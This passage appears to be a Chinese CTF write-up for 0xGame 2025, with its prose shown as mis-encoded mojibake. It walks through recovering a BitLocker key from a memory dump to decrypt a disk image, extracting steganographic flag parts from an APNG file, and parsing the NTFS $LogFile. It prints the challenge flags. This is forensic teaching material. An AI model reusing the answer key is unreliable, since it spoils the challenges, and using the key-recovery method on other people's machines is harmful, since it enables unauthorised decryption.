* -o loop æ˜¯æŒ‡å®šæˆ‘ä»¬åé¢æŒ‚è½½çš„æºæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç‰©ç†å—è®¾å¤‡ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿå—è®¾å¤‡ï¼Œå°†è¿™ä¸ªæ–‡ä»¶è§†ä¸ºä¸€ä¸ªç£ç›˜åˆ†åŒº

* -o ro è¿™ä¸ªæ˜¯åªè¯»é€‰é¡¹ï¼Œæˆ‘ä»¬åªèƒ½è¯»å–åŠ å¯†å·ï¼Œä¸åšç¼–è¾‘ï¼Œæ‰€ä»¥è¿™ä¸ªè¿˜æ˜¯è›®æœ‰å¿…è¦çš„ï¼Œåé¢æˆ‘ä»¬è¿›è¡Œå–è¯çš„æ—¶å€™ï¼Œå¦‚æœä¸æ…å°†æ–‡ä»¶ç¼–è¾‘ï¼ˆä¹Ÿè®¸æ­£å¥½æ˜¯æˆ‘ä»¬é‡è¦çš„æ–‡ä»¶å‘¢ï¼Ÿï¼‰ï¼Œè¿˜æ²¡æœ‰å¤‡ä»½ï¼Œè¿™ä¸ªé¢˜å°±å¯„äº†

* -t ntfs-3g è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ä¸Šé¢ä½¿ç”¨ fdisk æŸ¥çœ‹é•œåƒçš„æ—¶å€™ï¼Œè¯»å–åˆ°çš„

```text
Device                                    Boot Start    End Sectors Size Id Type
/home/yolo/Desktop/timu/0xGame/0xGame.dd1        128 198783  198656  97M  7 HPFS/NTFS/exFAT
```

åé¢ä¸¤ä¸ªå°±æ˜¯ dislocker-file å’ŒæŒ‚è½½ç‚¹äº†ï¼Œä¸ç»†è¯´äº†

æˆ‘çŒœå¤§å®¶ä¼šé—®ï¼Œæˆ‘ä»¬è¦å¦‚ä½•åˆ¤æ–­æŸä¸ª fvek æ˜¯æ­£ç¡®çš„å‘¢ï¼Ÿ

å¾ˆç®€å•ï¼Œä¸Šé¢è¿™ä¸ªå‘½ä»¤å¤±è´¥äº†ï¼Œå°±æ˜¯æ²¡è§£å¯†æˆåŠŸ

![image-20251015194637451](/img/0xgame2025/image-20251015194637451.png)

ç®€å•è¯´ä¸‹æŠ¥é”™ä¿¡æ¯ï¼ŒNTFS ç­¾åç¼ºå¤±ï¼ŒæŒ‚è½½å¤±è´¥ï¼Œè¿™ä¸ªéœ€è¦æŒ‚è½½çš„ä¸œè¥¿ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ NTFSï¼Œå·®ä¸å¤šå°±è¿™æ ·ï¼Œç„¶åæˆ‘ä»¬å°±è¯¥æ¢å…¶ä»–çš„å°è¯•äº†ï¼Œä»”ç»†è§‚å¯Ÿä¸‹ï¼Œä½ ä»¬åº”è¯¥ä¼šçœ‹å‡ºæ¥ï¼Œå°±ä¸¤ä¸ª fvek éœ€è¦å°è¯•å§ï¼Œç¬¬ä¸€ä¸ªæˆ‘ä»¬å·²ç»å°è¯•å¤±è´¥äº†ï¼Œç„¶åå…¨æ˜¯ 0 çš„é‚£ä¸ªæ²¡æœ‰å¿…è¦å°è¯•ï¼Œåªå‰©ä¸‹æœ€åä¸¤ä¸ªï¼Œä½†æ˜¯å®ƒä¸¤å…¶å®æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œçœ‹æ˜¾ç¤ºçš„åå…­è¿›åˆ¶éƒ¨åˆ†å°±èƒ½çœ‹å‡ºæ¥äº†

```bash
~$ ls /mnt/decrypted
'$RECYCLE.BIN'  'System Volume Information'   flag.txt
~$ cat /mnt/decrypted/flag.txt
0xGame{Wow_Y0u_@r3_BEsT_H@cker!!!_Coom3_0n!!!}
```

æŒ‚è½½å¥½åï¼Œè¯»å– flag å³å¯

##### vol3 å‘½ä»¤å±•ç¤º

> é‡Œé¢éƒ¨åˆ†æ–‡ä»¶è·¯å¾„æˆ‘ç»™ç®€åŒ–äº†ï¼Œå¤§æ¦‚çœ‹çœ‹è¿‡ç¨‹å°±å¥½äº†

```bash
yolo@yolo:~$ python vol.py -f memdump.mem -vvv windows.bitlocker.BitlockerFVEKScan --tags FVEc Cngb None --dislocker
yolo@yolo:~$ sudo mkdir -p /mnt/dislocker_tmp
yolo@yolo:~$ sudo mkdir -p /mnt/decrypted
yolo@yolo:~$ sudo dislocker -v --offset 65536 -k 0xe000899f7680-Dislocker.fvek -- 0xGame.dd /mnt/dislocker_tmp
yolo@yolo:~$ sudo mount -o loop,ro -t ntfs-3g /mnt/dislocker_tmp/dislocker-file /mnt/decrypted
yolo@yolo:~$ ls /mnt/decrypted
'$RECYCLE.BIN'  'System Volume Information'   flag.txt
yolo@yolo:~$ cat /mnt/decrypted/flag.txt
0xGame{Wow_Y0u_@r3_BEsT_H@cker!!!_Coom3_0n!!!}
yolo@yolo:~$ sudo umount /mnt/decrypted
yolo@yolo:~$ sudo umount /mnt/dislocker_tmp
yolo@yolo:~$ sudo rmdir /mnt/dislocker_tmp
yolo@yolo:~$ sudo rmdir /mnt/decrypted
```

##### passware kit forensic å±•ç¤º

> è¿™çœŸçš„æ˜¯ä¸€æŠŠæ¢­ï¼Œæ‰€ä»¥è¿˜æ˜¯å¸Œæœ›å­¦å¼Ÿå­¦å¦¹æŒæ¡äº†ä¸Šé¢ç”¨ vol æ‰‹åŠ¨æå–åï¼Œå†ä½¿ç”¨è¿™ä¸ªï¼ˆè‡³å°‘é€šè¿‡å†…å­˜è§£å¯† BitLocker çš„åŸç†å¾—è¯´å¾—ä¸Šä¸€äºŒå§

### A cute dog

æœ¬é¢˜ç¡®å®æ˜¯ä¸ªéš¾é¢˜ï¼ˆä½†æ˜¯è€ƒç‚¹å¹¶ä¸éš¾

`Apng`ï¼Œè¿™ä¸ªæ ¼å¼çš„å›¾ç‰‡å¯ä»¥è¯´æ˜¯ gif çš„ä¸‹ä¸€ä»£

é‚£ä¹ˆ gif çš„ç›¸å…³è€ƒç‚¹ä¹Ÿèƒ½ç”¨åˆ° Apng ä¸Šï¼ŒåŒæ—¶ï¼ŒApng ä¹Ÿå¯ä»¥çœ‹ä½œ pngï¼Œä¸€äº› png æœ‰å…³çš„è€ƒç‚¹ä¹Ÿèƒ½ç”¨åˆ°é‡Œé¢ï¼Œæœ€åæˆ‘ç´¢æ€§å†å¥—äº†ä¸ªå¨ƒï¼Œä½¿ç”¨ oursecret å¯¹æ•´ä¸ªæ–‡ä»¶è¿›è¡Œäº†éšå†™ï¼Œæ„Ÿè§‰å‰åé€»è¾‘è¿˜ç®—æ¸…æ™°å§

#### Apng æ ¼å¼ç®€å•æ¢³ç†

<https://lastnigtic.cn/posts/apng-editor/>

ä¸Šé¢é“¾æ¥ä»‹ç»çš„å¾ˆæ¸…æ™°å¾ˆæ¸…æ™°ï¼Œä¸‹é¢å°±é’ˆå¯¹é¢˜ç›®å¯èƒ½ç”¨åˆ°çš„çŸ¥è¯†ç®€å•è¯´è¯´

æŠŠå®ƒå½“ä½œ png å›¾ç‰‡å¤„ç†æ²¡æœ‰å¤ªå¤§çš„é—®é¢˜ï¼Œå®ƒæ–°å¢äº†å‡ ä¸ªæ•°æ®å—ï¼Œå…³æ³¨ä¸‹ fcTL å—ï¼Œå¯ä»¥æ§åˆ¶å¸§é—´æ··åˆæ•ˆæœï¼Œæ˜¯ç›´æ¥è¦†ç›–è¿˜æ˜¯éƒ¨åˆ†è¦†ç›–ï¼Œåç§»é‡å’Œå»¶æ—¶ç­‰ä¿¡æ¯

* sequence_number å¸§åºå·

* width å®½åº¦

* height é«˜åº¦

* x_offset æ­¤å¸§æ•°æ® x è½´åç§»é‡

* y_offset æ­¤å¸§æ•°æ® y è½´åç§»é‡

* delay_num é—´éš”åˆ†å­

* delay_den é—´éš”åˆ†æ¯

* dispose_op åœ¨æ˜¾ç¤ºè¯¥å¸§ä¹‹å‰ï¼Œéœ€è¦å¯¹å‰é¢ç¼“å†²è¾“å‡ºåŒºåŸŸåšä½•ç§å¤„ç†ã€‚

* blend_op å¸§æ¸²æŸ“ç±»å‹

ç„¶åæœ¬é¢˜ç¬¬ä¸€æ­¥è€ƒç‚¹æ˜¯æ—¶é—´è½´éšå†™

å¾ˆæ¸…æ¥šå§ï¼Œè¿™é‡Œçš„ delay_num å°±æ˜¯åŠ¨ç”»å»¶æ—¶æ—¶é—´ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬æå–ï¼Œè„šæœ¬é€»è¾‘å¾ˆå¥½æ‡‚å§ï¼Œåªè¦ç†Ÿæ‚‰ png çš„æ•°æ®ç»“æ„å°±èƒ½å¤„ç†äº†å‘¢ï¼Œä¸ç†Ÿæ‚‰æ•°æ®å—ç»„æˆçš„ï¼Œæ¥è¿™é‡Œçœ‹ï¼ˆ4+4+len(é•¿åº¦)+4ï¼‰ï¼Œæ‡‚æˆ‘æ„æ€ä¸ï¼Ÿ

```python
import struct

def extract_apng_Delay_num(apng_file_path):
	delay_numbers=[]
	try:
		with open(apng_file_path,'rb') as f:
			f.read(8)
			while True:
				length_bytes=f.read(4)
				if not length_bytes:
					break

				chunk_length=struct.unpack('>I',length_bytes)[0]
				chunk_type_bytes=f.read(4)
				chunk_type=chunk_type_bytes.decode('ascii')

				if chunk_type=='fcTL':
					if chunk_length!=26:
						print("wrong fctl chunk")
						f.read(chunk_length)

					else:
						chunk_data=f.read(chunk_length)
						delay_num=struct.unpack('>H',chunk_data[20:22])[0]
						delay_numbers.append(delay_num)
					f.read(4)
				elif chunk_type=='IEND':
					break

				else:
					f.read(chunk_length)
					f.read(4)
	except FileNotFoundError:
		print(f"file can not found")
		return

	print("extracted delay num")
	print(delay_numbers)
	print("-"*30)

	ascii_result=""
	for num in delay_numbers:
		if 32<=num<=126:
			ascii_result+=chr(num)
		else:
			pass
	print(f"ascii decoded:{ascii_result}")

if __name__=="__main__":
	file='a_cute_dog.png'
	extract_apng_Delay_num(file)
"""
extracted delay num
[116, 104, 101, 95, 50, 52, 116, 104, 95, 109, 97, 121, 98, 101, 95, 117, 115, 101, 102, 117, 108, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10]
------------------------------
ascii decoded:the_24th_maybe_useful

"""
```

å¯ä»¥è¯»å‡ºï¼Œéšå†™ä¿¡æ¯æ˜¯ç¬¬ 24 ä¸ªå›¾ç‰‡æœ‰ç‚¹ä¸œè¥¿ï¼Œé‚£å°±æƒ³åŠæ³•æ¢å¤å‡ºæ¥ï¼Œpython æœ‰ä¸ª apng åº“ï¼Œè¿˜æ˜¯æŒºå‰å®³çš„

```python
import os
from apng import APNG

def extract_apng_frames(apng_file_path,output_dir="frames_output"):
	if not os.path.exists(output_dir):
		os.makedirs(output_dir)
		print(f"create output dir")
	try:
		im=APNG.open(apng_file_path)
	except Exception as e:
		print("wrong,can not open file")
		return
	print("successfully load file")

	for i,(png_instance,control_instance) in enumerate(im.frames):
		frame_filename=f"frame_{i:03d}.png"
		output_path=os.path.join(output_dir,frame_filename)
		try:
			png_instance.save(output_path)
			print(f"save {i}:{output_path}")
		except Exception as e:
			print(f"can not save{i}")
			continue

	print(f"all saved in {output_dir}")
if __name__ =="__main__":
	input_file='a_cute_dog.png'
	output_folder='dog_frames'
	extract_apng_frames(input_file,output_folder)
```

æ¢å¤å‡ºæ¥åï¼Œç›´æ¥åˆ†æ frame_023.pngï¼ˆæ‡µé€¼äº†å§ï¼Œä¸ºå•¥æˆ‘ä¸åˆ†æ 024ï¼Ÿå› ä¸ºæ•´ä¸ª apng é€å¸§æå–å‡ºæ¥çš„ png æ˜¯ä» 0 å¼€å§‹çš„

å•çº¯è€ƒå¯Ÿäº† LSB éšå†™ï¼Œå‘ç°è¿™é‡Œéšå†™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯ä¼šå‘ç°å‹ç¼©åŒ…å®Œå…¨æ˜¯å€’ç€éšå†™è¿›å»çš„ï¼Œéœ€è¦æˆ‘ä»¬å¤„ç†ä¸‹ï¼Œç»†èŠ‚å¤§å®¶è‡ªå·±è§‚å¯Ÿï¼Œæˆ‘è¿™é‡Œç»™å‡ºè§£å†³æ–¹æ¡ˆï¼šç›´æ¥ç‚¹å‡» save binï¼Œå°†æ•´ä¸ª lsb éšå†™çš„äºŒè¿›åˆ¶ä¿¡æ¯æå–å‡ºæ¥ï¼Œè¡¥å……ï¼Œé‚£ä¸ª save text æ˜¯å°†é¢„è§ˆå³ä¾§çš„å¯è¯»å­—ç¬¦ç»™ä¿å­˜å‡ºæ¥äº†

æ³¨æ„è¿™é‡Œï¼Œç®­å¤´æ ‡æ³¨çš„åœ°æ–¹æ‰æ˜¯å‹ç¼©åŒ…å¤´

æˆ‘è¿™é‡Œå½¢å®¹ä¸‹ï¼Œæˆ‘è¦éšè— 123ï¼Œå°±æŒ‰ç…§ 321 çš„é¡ºåºéšè—è¿›å»çš„ï¼Œç„¶åå‘¢ï¼Œ50 è¿™æ ·çš„æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œä¸èƒ½å˜æˆ 05ï¼Œé€‰ä¸­å`ctrl+shift+c`å¤åˆ¶ï¼Œç„¶åæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œ`ctrl+shift+v`ç²˜è´´

æ¥ä¸‹æ¥å°±æ˜¯ç”¨ä¸€ä¸ªå¾ˆç®€å•å¾ˆç®€å•çš„ python è¿›è¡Œå€’åºè¾“å‡ºæ–‡ä»¶å³å¯

æ‹¿åˆ°äº†ç¬¬ä¸€éƒ¨åˆ† flag

```text
Congratulations!!!( â€¢Ì€ Ï‰ â€¢Ì )y
the gifts are these:

1.0xGame{Y0u_nn@stered_LSb_And_y0
2.the next challenge is in oursecret
3.the key is flag_part1
```

ç¬¬äºŒéƒ¨åˆ†æˆ‘æ„Ÿè§‰æˆ‘è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œéœ€è¦ç”¨åˆ°`oursecret`å·¥å…·ï¼Œç„¶åå¯†ç æ˜¯ç¬¬ä¸€éƒ¨åˆ† flagï¼Œç„¶åæ–‡ä»¶çš„è¯ï¼Œè‡ªç„¶æ˜¯é¢˜ç›®ä¸‹å‘çš„é‚£ä¸ªé™„ä»¶å•Š

> ç¡®å®ï¼Œè¿™é‡Œç®—æ˜¯æœ¬é¢˜çš„ä¸€ä¸ªè´¥ç¬”ï¼Œæˆ‘çš„åˆè¡·æ˜¯æƒ³è®¾è®¡ä¸€ä¸ªä¸ç”¨ä»»ä½•å·¥å…·çš„ misc é¢˜ç›®ï¼Œä½†æ˜¯è¿™æ˜¯æˆ‘ä¹‹å‰å‡ºçš„é¢˜äº†ï¼Œç°æ”¹ä¸èƒ½ä¿è¯å‡ºå¥½ï¼ˆä¸è¿‡ä¸è¦å–·æˆ‘å•Šï¼Œè¿™ç§æœ‰éšå†™å·¥å…·çš„é¢˜ç›®æ‰ç®—æ˜¯é‚£ç§å¾ˆå¸¸è§çš„ misc é¢˜å‘¢

å°† part2.zip è§£å‹åï¼Œæ‹¿åˆ°çš„å›¾ç‰‡ç”¨ 010 çœ‹ï¼Œä¼šå‘ç° crc æŠ¥é”™ï¼Œè¿™é‡Œå°±è€ƒå¯Ÿäº† crc å®½é«˜çˆ†ç ´ï¼Œå…³äºçˆ†ç ´åŸç†ï¼Œè¯·å»å‚è€ƒæˆ‘çš„[åšå®¢](https://yo1o.top/2025/04/13/png-challenge/)

ç„¶åå®½é«˜ä¿®æ”¹ï¼Œæˆ‘ä¹Ÿåœ¨ week2 ä¸Šè®²è¿‡ï¼Œéœ€è¦ä¿®æ”¹ IHDR å—çš„éƒ¨åˆ†å†…å®¹ï¼Œé«˜åº¦æ”¹ 800 å°±èƒ½æ‹¿åˆ°ç¬¬äºŒéƒ¨åˆ† flag

## Week4

### NTFS å¾ˆ ez å•¦

æœ¬é¢˜è€ƒå¯Ÿ ntfs æ—¥å¿—åˆ†æï¼ˆé¢˜å¤–è¯ï¼šåœ¨å­¦ä¹ åº”æ€¥å“åº”ç­‰å–è¯æ¯”èµ›ä¸­ï¼Œå¿…é¡»ç†Ÿæ‚‰ Windows æ³¨å†Œè¡¨ï¼Œæ—¥å¿—åˆ†æï¼ŒLinux ä¹Ÿè¦å­¦ï¼Œæœ¬é¢˜ç®—æ˜¯ä¸ªå¼•å­ï¼Œå¸Œæœ›å¤§å®¶èƒ½æ›´å¿«å…¥é—¨å®æˆ˜ï¼ŒæŒæ¡è¿‡ç¡¬æœ¬é¢†

è€ƒè™‘åˆ°å¤§å®¶æ˜¯ç¬¬ä¸€æ¬¡ç¢°åº”æ€¥å“åº”ï¼Œç»™å¤§å®¶æä¾›è¶³å¤Ÿçš„ hint äº†ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦å…³æ³¨æ—¥å¿—ï¼Œç„¶åå…³æ³¨ä¸€äº›æ–‡ä»¶åçš„å˜åŒ–

ç„¶ååœ¨ä¸€ä¸ª NTFS ç›˜ä¸­ï¼Œè®°å½•æ—¥å¿—çš„æ–‡ä»¶å«åš$LogFileï¼Œå®ƒçš„ä½œç”¨å¾ˆå¤šå¾ˆå¤š

#### $LogFile è®°å½•çš„æ—¥å¿—ç±»å‹

è®°å½•çš„å…ƒæ•°æ®æ“ä½œï¼š

* âœ… **æ–‡ä»¶åˆ›å»º/åˆ é™¤**

* âœ… **æ–‡ä»¶é‡å‘½å**

* âœ… **æƒé™å˜æ›´**

* âœ… **æ–‡ä»¶å¤§å°å˜åŒ–**

* âœ… **ç›®å½•ç»“æ„ä¿®æ”¹**

* âŒ **æ–‡ä»¶å®é™…å†…å®¹**ï¼ˆä¸è®°å½•ï¼‰

å¯ä»¥ç†è§£æˆ‘ä¸ºå•¥è¯´å®ƒå¾ˆé‡è¦äº†å§ï¼Œåœ¨å®æˆ˜ä¸­ï¼Œè¦æ˜¯æƒ³æ£€æµ‹ hacker åœ¨å“ªé‡Œå†™äº†ğŸï¼Œé€šè¿‡è¿™ä¸ª logfile è¿˜æ˜¯æœ‰å¯èƒ½æ‰¾åˆ°çš„ï¼Œè€Œä¸”å®ƒå‡ ä¹æ— æ³•è¢«ç¯¡æ”¹ï¼ˆç¯¡æ”¹éš¾åº¦å¾ˆå¤§ï¼Œåªæœ‰ SYSTEM æƒé™ï¼ˆæœ€é«˜æƒé™ï¼‰æ‰èƒ½å†™ï¼Œè¦ç»•è¿‡æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ï¼Œè¿˜è¦æ»¡è¶³å¤„ç†äº‹åŠ¡ä¸€è‡´æ€§æ£€æŸ¥

#### how to solve

å›åˆ°æœ¬é¢˜ï¼Œæœ‰å¤šç§æ–¹å¼æå–$LogFileï¼Œæˆ‘ä¸¾ä¸¤ä¸ªä¾‹å­

ç¬¬ä¸€ä¸ªæ˜¯ä½¿ç”¨ autopsy

æŒ‚è½½å¥½åï¼Œç›´æ¥æå–å³å¯

ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯ç”¨ 7z ç›´æ¥æ‰“å¼€ vhd

æ³¨æ„ï¼Œä¸€å®šè¦æ‰¾åˆ°æ­£ç¡®çš„è·¯å¾„

æå–å‡ºæ¥åï¼Œä¼šå‘ç°å®ƒæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åˆé€‚çš„å¹³å°æˆ–å·¥å…·æŒ‚è½½

æ¨èè¿™ä¸ªé¡¹ç›®<https://github.com/jschicht/LogFileParser>

è¿è¡Œå®Œåï¼Œä¼šåœ¨å·¥å…·è·¯å¾„ä¸‹å¾—åˆ°ä¸€å † csv æ–‡ä»¶ä»¥åŠå®Œæ•´çš„æ—¥å¿—æ•°æ®åº“æ–‡ä»¶

è¿™æ˜¯é‚£ä¸ªè®°å½• FileNames çš„ csvï¼Œå…¶å®å·²ç»å¯ä»¥çœ‹åˆ°éƒ¨åˆ†å…³é”®ä¿¡æ¯äº†ï¼Œä½†æ˜¯å¯¹æ­¤è¿˜æœ‰æ€€ç–‘ï¼Œå› ä¸ºå·¥å…·å¹¶æ²¡æœ‰å¸®åŠ©æˆ‘ä»¬è¾“å‡ºå‰åæ–‡ä»¶åå˜åŒ–ï¼Œæ¥ä¸‹æ¥ç›´æ¥åˆ†æé‚£ä¸ª db æ•°æ®åº“ï¼Œé‡Œé¢è®°å½•çš„ä¸œè¥¿æ›´å¤šï¼Œè€Œä¸”æ›´å¥½åˆ†ææ—¥å¿—

```bash
yolo@yolo:~/Desktop/timu$ sqlite3 ntfs.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
IndexEntries  LogFile
sqlite> .schema LogFile
CREATE TABLE LogFile (lf_Offset TEXT,lf_MFTReference INTEGER,lf_MftHdr_Seq INTEGER,lf_MftHdr_Lsn INTEGER,lf_MftHdr_Flags TEXT,lf_RealMFTReference INTEGER,lf_MFTBaseRecRef INTEGER,lf_LSN INTEGER,lf_LSNPrevious INTEGER,lf_RedoOperation TEXT,lf_UndoOperation TEXT,lf_OffsetInMft INTEGER,lf_FileName TEXT,lf_CurrentAttribute TEXT,lf_TextInformation TEXT,lf_UsnJrlFileName TEXT,lf_UsnJrlMFTReference INTEGER,lf_UsnJrlMFTParentReference INTEGER,lf_UsnJrlTimestamp TEXT,lf_UsnJrlReason TEXT,lf_UsnJrnlUsn INTEGER,lf_SI_CTime TEXT,lf_SI_ATime TEXT,lf_SI_MTime TEXT,lf_SI_RTime TEXT,lf_SI_FilePermission TEXT,lf_SI_MaxVersions INTEGER,lf_SI_VersionNumber INTEGER,lf_SI_ClassID INTEGER,lf_SI_SecurityID INTEGER,lf_SI_QuotaCharged INTEGER,lf_SI_USN INTEGER,lf_SI_PartialValue TEXT,lf_FN_CTime TEXT,lf_FN_ATime TEXT,lf_FN_MTime TEXT,lf_FN_RTime TEXT,lf_FN_AllocSize INTEGER,lf_FN_RealSize INTEGER,lf_FN_Flags TEXT,lf_FN_Namespace TEXT,lf_DT_StartVCN INTEGER,lf_DT_LastVCN INTEGER,lf_DT_ComprUnitSize INTEGER,lf_DT_AllocSize INTEGER,lf_DT_RealSize INTEGER,lf_DT_InitStreamSize INTEGER,lf_DT_DataRuns TEXT,lf_DT_Name TEXT,lf_FileNameModified INTEGER,lf_RedoChunkSize INTEGER,lf_UndoChunkSize INTEGER,lf_client_index INTEGER,lf_record_type INTEGER,lf_transaction_id INTEGER,lf_flags INTEGER,lf_target_attribute INTEGER,lf_lcns_to_follow INTEGER,lf_attribute_offset INTEGER,lf_MftClusterIndex INTEGER,lf_target_vcn INTEGER,lf_target_lcn INTEGER,InOpenAttributeTable INTEGER,FromRcrdSlack INTEGER,IncompleteTransaction INTEGER);
sqlite> 
```

> å‘½ä»¤è§£é‡Š

db æ˜¯ä¸€ç§æ•°æ®åº“æ–‡ä»¶ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ç”¨ sqlite3 å·¥å…·æ‰“å¼€è¿›è¡Œåˆ†æ

`.tables`å‘½ä»¤å¯ä»¥å¸®åŠ©æˆ‘ä»¬å°†æ•°æ®åº“ä¸‹é¢çš„è¡¨å•åˆ—å‡ºæ¥

`.schema <è¡¨å•>`å¯ä»¥å¸®åŠ©æˆ‘ä»¬å°†è¡¨å•ä¸­æ‰€æœ‰çš„é¡¹ç›®å­—æ®µç½—åˆ—å‡ºæ¥ï¼ˆä¸¾ä¾‹ï¼Œå°±åƒ excel è¡¨æ ¼å¤´ä¿¡æ¯é‚£æ ·

##### å°± LogFile è¡¨å­—æ®µåˆ†ç±»è¿›è¡Œè§£æ

* åŸºç¡€æ ‡è¯†å­—æ®µ

```text
lf_Offset TEXT,                    -- è®°å½•åœ¨$LogFileä¸­çš„ç‰©ç†åç§»åœ°å€
lf_MFTReference INTEGER,           -- MFTè®°å½•å·ï¼ˆæ–‡ä»¶IDï¼‰
lf_MftHdr_Seq INTEGER,             -- MFTåºåˆ—å·ï¼ˆé˜²é‡ç”¨ï¼‰
lf_MftHdr_Lsn INTEGER,             -- MFTå¤´ä¸­çš„LSN
lf_MftHdr_Flags TEXT,              -- MFTè®°å½•æ ‡å¿—ï¼ˆIN_USEç­‰ï¼‰
```

* äº‹åŠ¡å’Œæ“ä½œè·Ÿè¸ª

```text
lf_LSN INTEGER,                    -- æ—¥å¿—åºåˆ—å·ï¼ˆæ“ä½œé¡ºåºï¼‰
lf_LSNPrevious INTEGER,            -- å‰ä¸€ä¸ªLSNï¼ˆäº‹åŠ¡é“¾ï¼‰
lf_RedoOperation TEXT,             -- é‡åšæ“ä½œæè¿°
lf_UndoOperation TEXT,             -- æ’¤é”€æ“ä½œæè¿°  
lf_client_index INTEGER,           -- å®¢æˆ·ç«¯ç´¢å¼•ï¼ˆå“ªä¸ªç»„ä»¶æ‰§è¡Œæ“ä½œï¼‰
lf_record_type INTEGER,            -- è®°å½•ç±»å‹
lf_transaction_id INTEGER,         -- äº‹åŠ¡ID
```

* æ–‡ä»¶åç›¸å…³

```text
lf_FileName TEXT,                  -- æ–‡ä»¶åï¼ï¼ï¼ï¼ˆè¿™æ˜¯ä½ è¦æ‰¾çš„ï¼‰
lf_FileNameModified INTEGER,       -- æ–‡ä»¶åæ˜¯å¦è¢«ä¿®æ”¹çš„æ ‡å¿—
lf_UsnJrlMFTReference INTEGER,     -- USNæ—¥å¿—ä¸­çš„MFTå¼•ç”¨
lf_UsnJrlMFTParentReference INTEGER, -- USNæ—¥å¿—ä¸­çš„çˆ¶ç›®å½•MFTå¼•ç”¨
lf_UsnJrlFileName TEXT,           -- USNæ—¥å¿—ä¸­è®°å½•çš„æ–‡ä»¶å
lf_UsnJrlMFTReference INTEGER,    -- USNæ—¥å¿—ä¸­çš„MFTå¼•ç”¨å·
lf_UsnJrlMFTParentReference INTEGER, -- USNæ—¥å¿—ä¸­çˆ¶ç›®å½•çš„MFTå¼•ç”¨å·
lf_UsnJrlTimestamp TEXT,          -- USNæ—¥å¿—è®°å½•çš„æ—¶é—´æˆ³ï¼ˆé‡è¦ï¼ï¼‰
lf_UsnJrlReason TEXT,             -- USNå˜æ›´åŸå› ï¼ˆå¦‚åˆ›å»ºã€åˆ é™¤ã€é‡å‘½åç­‰ï¼‰
lf_UsnJrnlUsn INTEGER,            -- USNåºåˆ—å·
```

* æ—¶é—´æˆ³ä¿¡æ¯

```text
lf_SI_CTime TEXT,                  -- æ ‡å‡†ä¿¡æ¯åˆ›å»ºæ—¶é—´
lf_SI_ATime TEXT,                  -- æ ‡å‡†ä¿¡æ¯è®¿é—®æ—¶é—´  
lf_SI_MTime TEXT,                  -- æ ‡å‡†ä¿¡æ¯ä¿®æ”¹æ—¶é—´
lf_SI_RTime TEXT,                  -- æ ‡å‡†ä¿¡æ¯MFTè®°å½•æ—¶é—´
lf_FN_CTime TEXT,                  -- æ–‡ä»¶åä¿¡æ¯åˆ›å»ºæ—¶é—´
lf_FN_ATime TEXT,                  -- æ–‡ä»¶åä¿¡æ¯è®¿é—®æ—¶é—´
lf_FN_MTime TEXT,                  -- æ–‡ä»¶åä¿¡æ¯ä¿®æ”¹æ—¶é—´
lf_FN_RTime TEXT,                  -- æ–‡ä»¶åä¿¡æ¯MFTè®°å½•æ—¶é—´
```

* æ–‡ä»¶å±æ€§å’Œæ•°æ®

```text
lf_FN_AllocSize INTEGER,           -- åˆ†é…å¤§å°
lf_FN_RealSize INTEGER,            -- å®é™…å¤§å°
lf_FN_Flags TEXT,                  -- æ–‡ä»¶å±æ€§ï¼ˆå­˜æ¡£ã€éšè—ç­‰ï¼‰
lf_FN_Namespace TEXT,              -- æ–‡ä»¶åå‘½åç©ºé—´
lf_DT_DataRuns TEXT,               -- æ•°æ®è¿è¡Œåˆ—è¡¨ï¼ˆæ–‡ä»¶å†…å®¹ä½ç½®ï¼‰
lf_DT_RealSize INTEGER,            -- æ•°æ®å±æ€§å®é™…å¤§å°
```

* æ•°æ®å±æ€§ç›¸å…³å­—æ®µ

```text
lf_DT_StartVCN INTEGER,           -- æ•°æ®å±æ€§èµ·å§‹è™šæ‹Ÿç°‡å·
lf_DT_LastVCN INTEGER,            -- æ•°æ®å±æ€§æœ€åè™šæ‹Ÿç°‡å·  
lf_DT_ComprUnitSize INTEGER,      -- å‹ç¼©å•å…ƒå¤§å°
lf_DT_AllocSize INTEGER,          -- æ•°æ®å±æ€§åˆ†é…å¤§å°
lf_DT_RealSize INTEGER,           -- æ•°æ®å±æ€§å®é™…å¤§å°
lf_DT_InitStreamSize INTEGER,     -- åˆå§‹æµå¤§å°
lf_DT_DataRuns TEXT,              -- æ•°æ®è¿è¡Œåˆ—è¡¨ï¼ˆæ–‡ä»¶ç‰©ç†ä½ç½®ï¼‰
lf_DT_Name TEXT,                  -- æ•°æ®å±æ€§åç§°
```

* äº‹åŠ¡å’Œæ¢å¤ç›¸å…³

```text
lf_RealMFTReference INTEGER,      -- å®é™…çš„MFTå¼•ç”¨å·
lf_MFTBaseRecRef INTEGER,         -- MFTåŸºç¡€è®°å½•å¼•ç”¨
lf_OffsetInMft INTEGER,           -- åœ¨MFTè®°å½•ä¸­çš„åç§»é‡
lf_CurrentAttribute TEXT,         -- å½“å‰æ“ä½œçš„å±æ€§ç±»å‹
lf_TextInformation TEXT,          -- æ–‡æœ¬ä¿¡æ¯ï¼ˆå¯èƒ½åŒ…å«æ–‡ä»¶å†…å®¹ç‰‡æ®µï¼‰
lf_RedoChunkSize INTEGER,         -- é‡åšæ“ä½œæ•°æ®å—å¤§å°
